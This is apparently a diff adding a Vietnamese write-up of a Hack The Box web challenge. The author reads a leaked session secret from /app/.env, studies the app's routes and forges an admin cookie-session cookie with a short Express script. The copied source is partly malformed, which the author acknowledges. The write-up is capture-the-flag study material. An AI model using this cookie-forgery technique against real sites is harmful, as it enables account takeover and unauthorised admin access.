@@ -7,7 +7,7 @@ tags: web js cookie convert-svg-core
 # Foreword
 Đây là một challenge trong mục web của Hack The Box, challenge này từ sự kiện hackthebox Cyber Apocalypse CTF 2022 mà mình đã không tham gia. Nay vào làm thì thấy nó released trên trang chủ luôn nên mình làm cho vui.
 
-# Information Gathering
+# Solution
 Mới vào thì web sẽ hiện cho ta một form đăng kí, đăng nhập như sau:
 
 ![image](https://user-images.githubusercontent.com/75429369/171791521-df1d7302-4033-4fe8-8c3d-a32eaca40643.png)
@@ -116,3 +116,125 @@ app.all('*', (req, res) => {
 ```
 _Note: source có thể không giống 100% tại mình copy bằng blackbox nên sợ không đúng, mong các bạn thông cảm_
 
+Okay, dễ thấy web có sử dụng `cookie-session`, include thư mục `./routes` và `./database`, nhưng chỗ cần chú ý nhất là `SESSION_SECRET_KEY` có thể được include từ `/app/.env`, thử đọc thư mục này xem có SECRET KEY không nhé
+
+![image](https://user-images.githubusercontent.com/75429369/171844184-df728cd5-9ec4-4a9f-bb9e-325207ac3012.png)
+
+Yes, vậy có thể hình dung được, ta sẽ dùng SECRET KEY này để generate lại một cookie của user nào đó có thể đọc được flag, để mình check xem thử cookie hiện tại là gì. 
+
+![image](https://user-images.githubusercontent.com/75429369/171844465-60638acb-6ba5-4671-99fc-3d86ddb049b0.png)
+
+`session` thì khi decode bằng base64 thì ta được `{"username":"mtiennnnn"}` -> đúng như username dùng để đăng kí và đăng nhập, còn `session.sig` có vẻ như được generate từ session. Vậy thì giờ chỉ cần tìm xem còn username nào có thể đọc được flag. Nhớ lại thì trong `index.js` còn include `./routes`, check thử `./routes/index.js` xem có gì nhé
+
+![image](https://user-images.githubusercontent.com/75429369/171844999-50237d26-eb74-47ba-9d44-03f8e9491f42.png)
+
+/app/routes/index.js
+```js
+const fs = require('fs'); 
+const path = require('path'); 
+const crypto = require('crypto'); 
+const express = require('express'); 
+const router = express. Router({caseSensitive: true});
+const AuthMiddleware = require('../middleware/AuthMiddleware'); 
+const { convert } = require('convert-svg-to-png'); 
+const { execSync } = require('child_process'); 
+let db;
+
+const response = data => ({ message: data});
+
+router.get('/', (req, res) => {
+	return res.render('login.html');
+});
+
+router.post('/api/register', async (req, res) => {
+	const { username, password } = req.body;
+
+	if (username && password) {
+		return db.getUser(username)
+			.then(user => {
+				if (user) return res.status(401).send(response('This UUID is already registered!'));
+				return db.registerUser(username, password)
+					.then(() => res.send(response('Account registered successfully!')))
+			})
+			.catch(() => res.status(500).send(response('SOmething went wrong!')));
+	}
+	return res.status(401).send(response('Please fill out all the required fields!'));
+});
+
+router.post('/api/login', async (req, res) => {
+	const { username, password } = req.body;
+
+	if (username && password) {
+		return db.loginUser(username, password)
+			.then(user => {
+				req.session.username = user.username;
+				res.send(response('User authenticated successfully!'));
+			})
+			.catch((e) => {
+				console.log(e);
+				res.status(403).send(response('Invalid UUID or password!'));
+			});
+	}
+	return res.status(500).send(response('Missing parameters!'));
+});
+
+router.get('/dashboard', AuthMiddleware, async (req, res, next) => {
+	if (req.session.username === 'admin') {
+		let flag = execSync('../readflag').toString();
+		return res.render('admin.html', { flag });
+	}
+	return res.render('dashboard.html');
+});
+
+router.post('/api/export', async (req, res, next) => {
+	const { svg } = req.body;
+
+	try {
+		const png = await convert{
+			svg,
+			{
+				...
+			}
+		}
+	}
+})
+```
+_Note: source có thể không giống 100% tại mình copy bằng blackbox nên sợ không đúng, mong các bạn thông cảm_
+
+Lần đầu tiên trong bài, ta thấy sự hiện diện của `flag`, vậy với `username` là `admin` thì web sẽ render flag ra cho ta (nghe ez vãi). But wait, username thì ta biết có thể tùy chỉnh từ cookie `session`, vậy còn `session.sig` ???  Như đã nói ở trên, vì chúng ta đã tìm được SESSION_SECRET_KEY, với SECRET KEY đó ta có thể sign ra bất cứ session cookie nào ta mong muốn. Vậy thì mục tiêu cuối cùng của bài sẽ là generate ra `session.sig` với username là `admin`.
+
+Tận dụng code có sẵn của bài, ta sẽ tự generate cookie session.sig ở local rồi sử dụng nó lên web chính thì sẽ lụm tiền. Script generate:
+
+script app.js
+```js
+const express = require('express');
+const session = require('cookie-session');
+const app = express();
+const cookieParser = require('cookie-parser');
+
+app.use(cookieParser()); 
+app.use(session({
+	name: 'session',
+	keys: ['fc8c7ef845baff7935591112465173e7']
+}))
+
+app.get('/', (req, res) => {
+	req.session.username = 'admin'
+	res.status(200).send(('done'));
+});
+
+app.listen(6969);
+```
+
+Access tới `localhost:6969`, lấy cookie rồi xài cookie đó với web chính vàaaaaaa...
+
+![image](https://user-images.githubusercontent.com/75429369/171847225-42823085-69ec-43ce-bc7b-3807b9e76f6f.png)
+
+![image](https://user-images.githubusercontent.com/75429369/171847333-5bcaa4a5-d929-476b-b44f-6fe917cbc354.png)
+
+flag kìaaaaa
+
+# Conclusion
+Thật sự mà nói bài này khó thì không, thậm chí nó còn được đánh giá dễ trên HTB, nhưng vẫn nằm trong mục `medium` vì bài này đòi hỏi mò cực nhiều ... Nhưng nhìn chung là một challenge hay, đòi hỏi nhiều kĩ năng và một chút may mắn. Mong sẽ làm thêm được nhiều bài nữa!!!
+
+_Thanks for reading_
